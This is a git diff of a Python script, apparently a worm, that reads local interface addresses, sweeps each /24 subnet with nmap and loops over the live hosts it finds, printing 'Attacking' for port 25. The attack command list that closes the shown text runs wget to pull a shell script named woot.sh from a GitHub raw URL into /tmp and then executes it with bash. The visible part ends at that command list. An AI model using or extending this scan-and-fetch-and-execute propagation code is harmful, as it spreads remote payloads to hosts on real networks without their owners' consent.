@@ -7,52 +7,34 @@ from socket import *
 import sys
 import time
 import subprocess
-import ipaddress
-
-def paired(iterable):
-	a = iter(iterable)
-	return zip(a, a)
+import re
 
 def find_subnets():
 	ifconfig = subprocess.check_output(['ifconfig'], text = True)
-	# rn i want this example inet 172.19.0.1  
+	# rn i want this example inet 172.19.0.1 
 	strs = ifconfig.split("\n ")
 	lst = []
 	for item in strs:
-		if 'inet' in item and not '127.0.0.1' in item:
-			lst.append(item)
-	lst = str(lst)
-	lst = lst.split("  ")
-	
+		#item = re.search(r"inet \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", item)
+		#if x != None:
+		x = re.findall(r"inet\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", item)
+		if x:
+			lst.append(x[0])
 			
-	targets = []
-	for item in lst: #tryna get 1.2.3.4/255.255.0.0 etc
-		if 'inet ' in item:
-			i = item[6:] # to get 1.2.3.4
-			i += '/24' # to get /24 time
-			targets.append(str(i))
-	
-	# myownaddy = targets[0] # need own addy so i dotn end upo sending shit twice  - for now does not work, no need for sneeding
-	# step 1 - find suitable targets for nmap complete
-	# print("Own address: "+ str(myownaddy))
-	print("Targets:" + str(targets))
-	nmap_res = []
-	for item in targets:
-		nmap_ret = subprocess.check_output(['nmap', item], text = True)
-		if not 'All 1000 scanned ports on' in nmap_ret:
-			strs = nmap_ret.split("\n")
-			for i in strs:
-				if 'Nmap scan report for' in i:
-					nmap_scan_report = i.split('(')
-					for losing_my_shit in nmap_scan_report:
-						if not 'Nmap' in losing_my_shit and losing_my_shit != myownaddy:
-							nmap_res.append(losing_my_shit.translate({ord(x): None for x in ')'})) # da ip
+	nmap_result = {}		
+	for item in lst:
+		nmap_return = subprocess.check_output(['nmap', item + "/24"], text = True)
+		
+		nmap_return = nmap_return.split("\n ")
+		for i in nmap_return:
+			x = re.findall(r"\((\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\)", i)
+			if x:
+				for v in x:
+					nmap_result[v] = True	
 
-	return nmap_res # return the resolution of ips that are up
+	return nmap_result.keys() # return the resolution of ips that are up
 	
-addy_list = find_subnets()
-print("Address List: " + str(addy_list))
-for ADDR in addy_list:
+for ADDR in find_subnets():
 		PORT = 25
 		print("Attacking: "+ ADDR + " " + str(PORT))
 		CMD = ['wget -O /tmp/woot.sh raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/woot.sh', 'bash /tmp/woot.sh']
